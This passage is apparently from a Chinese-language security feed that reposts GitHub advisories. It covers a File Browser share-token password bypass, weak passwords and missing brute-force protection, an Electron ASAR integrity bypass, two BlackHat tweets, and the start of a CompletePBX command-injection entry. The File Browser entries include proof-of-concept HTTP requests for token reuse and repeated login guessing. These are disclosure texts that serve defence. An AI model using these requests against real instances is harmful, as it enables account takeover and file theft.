class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;pdf&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;token&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;voDK6j[...]&quot;</span><span class="hljs-punctuation">&#125;</span></span></span><br></code></pre></td></tr></table></figure><p>But it does not return the actual file content but rather an access token.<br>This is the very same token that is already part of the second share URL and is used by the web application to recreate the actual download URL.<br>If you are in possession of that one, no further password check is performed, and the content of the file is returned:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api/public/dl/6Gtw0xAw?inline=true&amp;token=voDK6j[...]</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>filebrowser.local:8080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-GPC</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://filebrowser.local:8080/share/6Gtw0xAw<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br><br><span class="language-http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK</span><br><span class="language-http"><span class="hljs-attribute">Accept-Ranges</span><span class="hljs-punctuation">: </span>bytes</span><br><span class="language-http"><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>private</span><br><span class="language-http"><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>inline</span><br><span class="language-http"><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>7703</span><br><span class="language-http"><span class="hljs-attribute">Content-Security-Policy</span><span class="hljs-punctuation">: </span>default-src &#x27;self&#x27;; style-src &#x27;unsafe-inline&#x27;;</span><br><span class="language-http"><span class="hljs-attribute">Content-Security-Policy</span><span class="hljs-punctuation">: </span>script-src &#x27;none&#x27;;</span><br><span class="language-http"><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/pdf</span><br><span class="language-http"><span class="hljs-attribute">Last-Modified</span><span class="hljs-punctuation">: </span>Mon, 03 Mar 2025 15:11:45 GMT</span><br><span class="language-http"><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Thu, 27 Mar 2025 10:59:18 GMT</span><br><span class="language-http"></span><br><span class="language-http"><span class="language-routeros">%PDF-1.4</span></span><br><span class="language-routeros"><span class="language-http">%Çì¢</span></span><br><span class="language-routeros"><span class="language-http">%%Invocation: path/gs -P- -dSAFER <span class="hljs-attribute">-dCompatibilityLevel</span>=1.4 -q -P- -dNOPAUSE -dBATCH <span class="hljs-attribute">-sDEVICE</span>=pdfwrite <span class="hljs-attribute">-sstdout</span>=? <span class="hljs-attribute">-sOutputFile</span>=? -P- -dSAFER <span class="hljs-attribute">-dCompatibilityLevel</span>=1.4 -</span></span><br><span class="language-routeros"><span class="language-http">5 0 obj</span></span><br><span class="language-routeros"><span class="language-http">[<span class="hljs-built_in">..</span>.]</span></span><br></code></pre></td></tr></table></figure><h2 id="Recommended-Countermeasures"><a href="#Recommended-Countermeasures" class="headerlink" title="Recommended Countermeasures"></a>Recommended Countermeasures</h2><p>A short time solution would be to simple remove the second link from the GUI when a password protected share is created.<br>Doing so will be a proper defense against user errors, but it will still leave unprotected links in various logs.<br>A thorough fix has to eliminate the unprotected links completely, access to the file must only be given to requests containing the share password.</p><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><code>2025-03-27</code> Identified the vulnerability in version 2.32.0</li><li><code>2025-04-11</code> Contacted the project</li><li><code>2025-04-29</code> Vulnerability disclosed to the project</li><li><code>2025-06-25</code> Uploaded advisories to the project’s GitHub repository</li><li><code>2025-06-25</code> CVE ID assigned by GitHub</li><li><code>2025-06-29</code> Mitigation of user error released in version 2.34.2</li><li><code>2025-06-29</code> Issue <a href="https://github.com/filebrowser/filebrowser/issues/5239">#5239</a> opened to track a more thorough fix of the feature</li></ul><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://cwe.mitre.org/data/definitions/305.html">CWE-305: Authentication Bypass by Primary Weakness</a></li></ul><h2 id="Credits"><a href="#Credits" class="headerlink" title="Credits"></a>Credits</h2><ul><li>Mathias Tausig (<a href="https://www.sba-research.org/">SBA Research</a>)</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-3v48-283x-f2w4&quot;&gt;https://github.com/advisories/GHSA-3v48-283x-f2w4&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>File Browser vulnerable to insecure password handling</title>
    <link href="http://example.com/2025/06/30/github_654340709/"/>
    <id>http://example.com/2025/06/30/github_654340709/</id>
    <published>2025-06-30T18:00:11.720Z</published>
    <updated>2025-06-30T18:00:11.718Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-cm2r-rg7r-p7gg">https://github.com/advisories/GHSA-cm2r-rg7r-p7gg</a></p><p><strong>仓库 Star：</strong> 30015</p><p><strong>CVSS 评分：</strong> 5.9</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-cm2r-rg7r-p7gg">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-cm2r-rg7r-p7gg</a></p></li><li><p><a href="https://github.com/advisories/GHSA-cm2r-rg7r-p7gg">https://github.com/advisories/GHSA-cm2r-rg7r-p7gg</a></p></li></ul><p><strong>描述：</strong></p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>All user accounts authenticate towards a <em>File Browser</em> instance with a password. A missing password policy and brute-force protection makes it impossible for administrators to properly secure the authentication process.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>Attackers can mount a brute-force attack against the passwords of all accounts of an instance. Since the application is lacking the ability to prevent users from choosing a weak password, the attack is likely to succeed.</p><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>The application implement a classical authentication scheme using a username and password combination. While employed by many systems, this scheme is quite error-prone and a common cause for vulnerabilities. File Browser’s implementation has multiple weak points:</p><ol><li>Since the application is missing the capability for administrators to define a password policy, users are at liberty to set trivial and well-known passwords such as <code>secret</code> or even ones with only single digit like <code>1</code>.</li><li>New instances are set up with a default password of <code>admin</code> for the initial administrative account. This password is well known and easily guessable. While the documentation advises to change this password, the application does not technically enforce it.</li><li>The application does not implement any brute-force protection for the authentication endpoint. Attackers can make as many guesses for a password as the network bandwidth allows.</li></ol><p>The combination of these problems makes it likely, that an attacker will succeed in compromising at least one account in a <em>File Browser</em> instance, possibly even one with administrative privileges. The likelihood of such an attack increases substantially for internet-facing instances.</p><h2 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h2><p>The insecure default credentials are documented on the application’s website:</p><p><img src="https://github.com/user-attachments/assets/46c07d99-dc7b-4d6e-ac27-7eb002229201" alt="image"></p><p>The following HTTP communication shows, that a trivial password of <code>1</code> can be configured by a user:</p><figure class="highlight http"><figcaption><span>hl:17</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/api/users/2</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>filebrowser.local:8080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://filebrowser.local:8080/settings/profile<br><span class="hljs-attribute">X-Auth</span><span class="hljs-punctuation">: </span>eyJ[...]<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/plain;charset=UTF-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>319<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://filebrowser.local:8080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>auth=eyJ[...]<br><span class="hljs-attribute">X-PwnFox-Color</span><span class="hljs-punctuation">: </span>cyan<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-nix">&#123;<span class="hljs-string">&quot;what&quot;</span>:<span class="hljs-string">&quot;user&quot;</span>,<span class="hljs-string">&quot;which&quot;</span>:[<span class="hljs-string">&quot;password&quot;</span>],<span class="hljs-string">&quot;data&quot;</span>:&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">2</span>,<span class="hljs-string">&quot;locale&quot;</span>:<span class="hljs-string">&quot;en&quot;</span>,<span class="hljs-string">&quot;viewMode&quot;</span>:<span class="hljs-string">&quot;mosaic&quot;</span>,<span class="hljs-string">&quot;singleClick&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;perm&quot;</span>:&#123;<span class="hljs-string">&quot;admin&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;execute&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;create&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;rename&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;modify&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;delete&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;share&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;download&quot;</span>:<span class="hljs-literal">true</span>&#125;,<span class="hljs-string">&quot;commands&quot;</span>:[],<span class="hljs-string">&quot;lockPassword&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;hideDotfiles&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;dateFormat&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>&#125;&#125;</span><br><span class="language-nix"></span><br><span class="language-nix">HTTP<span class="hljs-symbol">/1.1</span> <span class="hljs-number">200</span> OK</span><br><span class="language-nix"><span class="hljs-params">Cache-Control:</span> no-cache, no-store, must-revalidate</span><br><span class="language-nix"><span class="hljs-params">Content-Security-Policy:</span> default-src &#x27;self&#x27;; style-src &#x27;unsafe-inline&#x27;;</span><br><span class="language-nix"><span class="hljs-params">Content-Type:</span> text<span class="hljs-symbol">/plain</span>; <span class="hljs-attr">charset</span><span class="hljs-operator">=</span>utf-<span class="hljs-number">8</span></span><br><span class="language-nix"><span class="hljs-params">X-Content-Type-Options:</span> nosniff</span><br><span class="language-nix"><span class="hljs-params">Date:</span> Thu, <span class="hljs-number">27</span> Mar <span class="hljs-number">2025</span> <span class="hljs-number">08</span>:<span class="hljs-number">31</span>:<span class="hljs-number">34</span> GMT</span><br><span class="language-nix"><span class="hljs-params">Content-Length:</span> <span class="hljs-number">7</span></span><br><span class="language-nix"></span><br><span class="language-nix"><span class="hljs-number">200</span> OK</span><br></code></pre></td></tr></table></figure><p>The missing brute-force protection can easily be tested by repeatedly sending the following request to the application with a tool such as Burp or hydra.</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/login</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>filebrowser.local:8080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>52<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://filebrowser.local:8080<br><br><span class="language-nix">&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;myPasswordGuess&quot;</span>,<span class="hljs-string">&quot;recaptcha&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;</span><br><span class="language-nix"></span><br><span class="language-nix">HTTP<span class="hljs-symbol">/1.1</span> <span class="hljs-number">403</span> Forbidden</span><br><span class="language-nix"><span class="hljs-params">Cache-Control:</span> no-cache, no-store, must-revalidate</span><br><span class="language-nix"><span class="hljs-params">Content-Security-Policy:</span> default-src &#x27;self&#x27;; style-src &#x27;unsafe-inline&#x27;;</span><br><span class="language-nix"><span class="hljs-params">Content-Type:</span> text<span class="hljs-symbol">/plain</span>; <span class="hljs-attr">charset</span><span class="hljs-operator">=</span>utf-<span class="hljs-number">8</span></span><br><span class="language-nix"><span class="hljs-params">X-Content-Type-Options:</span> nosniff</span><br><span class="language-nix"><span class="hljs-params">Date:</span> Thu, <span class="hljs-number">27</span> Mar <span class="hljs-number">2025</span> <span class="hljs-number">08</span>:<span class="hljs-number">39</span>:<span class="hljs-number">48</span> GMT</span><br><span class="language-nix"><span class="hljs-params">Content-Length:</span> <span class="hljs-number">14</span></span><br><span class="language-nix"></span><br><span class="language-nix"><span class="hljs-number">403</span> Forbidden</span><br></code></pre></td></tr></table></figure><p>After sending 3000 bad passwords to the application within a few seconds, a successful authentication is still possible for the account:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/login</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>filebrowser.local:8080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>54<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://filebrowser.local:8080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-nix">&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;myCorrectPassword&quot;</span>,<span class="hljs-string">&quot;recaptcha&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;</span><br><span class="language-nix"></span><br><span class="language-nix">HTTP<span class="hljs-symbol">/1.1</span> <span class="hljs-number">200</span> OK</span><br><span class="language-nix"><span class="hljs-params">Cache-Control:</span> no-cache, no-store, must-revalidate</span><br><span class="language-nix"><span class="hljs-params">Content-Security-Policy:</span> default-src &#x27;self&#x27;; style-src &#x27;unsafe-inline&#x27;;</span><br><span class="language-nix"><span class="hljs-params">Content-Type:</span> text<span class="hljs-symbol">/plain</span></span><br><span class="language-nix"><span class="hljs-params">Date:</span> Thu, <span class="hljs-number">27</span> Mar <span class="hljs-number">2025</span> <span class="hljs-number">08</span>:<span class="hljs-number">39</span>:<span class="hljs-number">58</span> GMT</span><br><span class="language-nix"><span class="hljs-params">Content-Length:</span> <span class="hljs-number">508</span></span><br><span class="language-nix"></span><br><span class="language-nix">eyJ[...]</span><br></code></pre></td></tr></table></figure><h2 id="Recommended-Countermeasures"><a href="#Recommended-Countermeasures" class="headerlink" title="Recommended Countermeasures"></a>Recommended Countermeasures</h2><p>The application should add an option to define a password policy in its administrative interface which allows to set a minimum length for passwords.<br>The default settings should be in line with the NIST publication SP 800-63B. This means, that now passwords of fewer than 8 characters should ever be allowed by the application.<br>Whenever a user sets a new password, the application should verify whether that password is part of a “known passwords” list.</p><p>The application should either create a secure and random password for the <code>admin</code> account upon initialization or enforce an immediate password change when that user logs in for the first time using the default password.</p><p>A brute-force protection needs to be implemented, which limits the allowed amount of authentication attempts per user within a certain timeframe. This implementation should employ <em>device tokens</em> to prevent targeted lockout attacks.</p><p>In addition, it would be advisable to allow the integration of the application into and existing <em>Identity Provider</em> using protocols like LDAP or OIDC.</p><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><code>2025-03-27</code> Identified the vulnerability in version 2.32.0</li><li><code>2025-04-11</code> Contacted the project</li><li><code>2025-04-29</code> Vulnerability disclosed to the project</li><li><code>2025-06-25</code> Uploaded advisories to the project’s GitHub repository</li><li><code>2025-06-26</code> CVE ID assigned by GitHub</li><li><code>2025-06-29</code> Fix released in version 2.34.1</li></ul><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#implement-proper-password-strength-controls">OWASP Authentication Cheat Sheet</a></li><li><a href="https://pages.nist.gov/800-63-4/sp800-63b.html#password">NIST Special Publication 800-63B. Digital Identity Guidelines. Passwords</a></li><li><a href="https://haveibeenpwned.com/Passwords">Pwned Passwords</a></li><li><a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials">Common Credentials</a></li><li><a href="https://cwe.mitre.org/data/definitions/307.html">CWE-307: Improper Restriction of Excessive Authentication Attempts</a></li><li><a href="https://cwe.mitre.org/data/definitions/521.html">CWE-521: Weak Password Requirements</a></li><li><a href="https://cwe.mitre.org/data/definitions/1392.html">CWE-1392: Use of Default Credentials</a></li></ul><h2 id="Credits"><a href="#Credits" class="headerlink" title="Credits"></a>Credits</h2><ul><li>Mathias Tausig (<a href="https://www.sba-research.org/">SBA Research</a>)</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-cm2r-rg7r-p7gg&quot;&gt;https://github.com/advisories/GHSA-cm2r-rg7r-p7gg&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>electron ASAR Integrity bypass by just modifying the content</title>
    <link href="http://example.com/2025/06/30/github_779332663/"/>
    <id>http://example.com/2025/06/30/github_779332663/</id>
    <published>2025-06-30T18:00:10.407Z</published>
    <updated>2025-06-30T18:00:10.406Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-xw5q-g62x-2qjc">https://github.com/advisories/GHSA-xw5q-g62x-2qjc</a></p><p><strong>仓库 Star：</strong> 117291</p><p><strong>CVSS 评分：</strong> 7.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://github.com/electron/electron/security/advisories/GHSA-xw5q-g62x-2qjc">https://github.com/electron/electron/security/advisories/GHSA-xw5q-g62x-2qjc</a></p></li><li><p><a href="https://github.com/advisories/GHSA-xw5q-g62x-2qjc">https://github.com/advisories/GHSA-xw5q-g62x-2qjc</a></p></li></ul><p><strong>描述：</strong></p><p>electron’s ASAR Integrity can be bypass by modifying the content.</p><h3 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h3><p>This only impacts apps that have the <code>embeddedAsarIntegrityValidation</code> and <code>onlyLoadAppFromAsar</code> <a href="https://www.electronjs.org/docs/latest/tutorial/fuses">fuses</a> enabled. Apps without these fuses enabled are not impacted. This issue is specific to Windows, apps using these fuses on macOS are unimpacted.</p><p>Specifically this issue can only be exploited if your app is launched from a filesystem the attacker has write access too. i.e. the ability to edit files inside the .app bundle on macOS which these fuses are supposed to protect against.</p><h3 id="Workarounds"><a href="#Workarounds" class="headerlink" title="Workarounds"></a>Workarounds</h3><p>There are no app side workarounds, you must update to a patched version of Electron.</p><h3 id="Fixed-Versions"><a href="#Fixed-Versions" class="headerlink" title="Fixed Versions"></a>Fixed Versions</h3><ul><li><code>30.0.5</code></li><li><code>31.0.0-beta.1</code></li></ul><h3 id="For-more-information"><a href="#For-more-information" class="headerlink" title="For more information"></a>For more information</h3><p>If you have any questions or comments about this advisory, email us at <a href="mailto:&#115;&#101;&#99;&#117;&#x72;&#x69;&#x74;&#121;&#x40;&#x65;&#108;&#x65;&#x63;&#116;&#114;&#111;&#110;&#106;&#x73;&#46;&#111;&#x72;&#x67;">security@electronjs.org</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-xw5q-g62x-2qjc&quot;&gt;https://github.com/advisories/GHSA-xw5q-g62x-2qjc&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>BlackHatEvents twitter update</title>
    <link href="http://example.com/2025/06/30/twitter_985847442/"/>
    <id>http://example.com/2025/06/30/twitter_985847442/</id>
    <published>2025-06-30T17:00:34.169Z</published>
    <updated>2025-06-30T17:00:34.167Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> RT @Darktrace：你准备好参加@BlackHatEvents了吗？我们准备好了！⚡</p><p>来5636号展位找我们，看看我们的自学习AI如何保护你的整个组织…</p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1939715791777079694">https://x.com/BlackHatEvents/status/1939715791777079694</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; RT @Darktrace：你准备好参加@BlackHatEvents了吗？我们准备好了！⚡&lt;/p&gt;
&lt;p&gt;来5636号展位找我们，看看我们的自学</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
    
  </entry>
  
  <entry>
    <title>BlackHatEvents twitter update</title>
    <link href="http://example.com/2025/06/30/twitter_3206083310/"/>
    <id>http://example.com/2025/06/30/twitter_3206083310/</id>
    <published>2025-06-30T17:00:24.853Z</published>
    <updated>2025-06-30T17:00:24.851Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> 加入我们的#BlackHat秋季培训！10月20日至23日在线直播培训。在全球专家讲师的指导下，学习热门的#网络安全技术培训课程🌍。从基础设施黑客攻击到事件响应，无论您的经验水平如何，都能找到适合的课程！📈 立即注册 &gt;&gt; <a href="https://t.co/XVzu5buRof">https://t.co/XVzu5buRof</a></p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1939718514278846813">https://x.com/BlackHatEvents/status/1939718514278846813</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 加入我们的#BlackHat秋季培训！10月20日至23日在线直播培训。在全球专家讲师的指导下，学习热门的#网络安全技术培训课程🌍。从基础设施黑</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
    
  </entry>
  
  <entry>
    <title>Xorcom CompletePBX Authenticated Command Injection via Task Scheduler</title>
    <link href="http://example.com/2025/06/30/github_1698775966/"/>
    <id>http://example.com/2025/06/30/github_1698775966/</id>
    <published>2025-06-30T16:15:17.429Z</published>
    <updated>2025-06-30T16:15:17.425Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Xorcom CompletePBX Authenticated Command Injection via Task Scheduler</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> 2025-30004</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Xorcom CompletePBX 5.2.35及更早版本中存在一个通过任务调度功能实现的认证命令注入漏洞。该漏洞允许具有超级管理员权限的用户（admin）通过不当清理的用户控制输入，以Web服务器权限执行任意命令。即使创建具有最高权限的新用户，该漏洞也无法利用。</p><p><strong>产品厂商：</strong> Xorcom</p><p><strong>产品名称：</strong> CompletePBX</p><p><strong>影响版本：</strong> &lt;&#x3D; 5.2.35</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/837363493262e4490ea7c723fd612eb26a8201fa/modules%2Fexploits%2Flinux%2Fhttp%2Fxorcom_completepbx_scheduler.rb">https://github.com/rapid7/metasploit-framework/blob/837363493262e4490ea7c723fd612eb26a8201fa/modules%2Fexploits%2Flinux%2Fhttp%2Fxorcom_completepbx_scheduler.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight 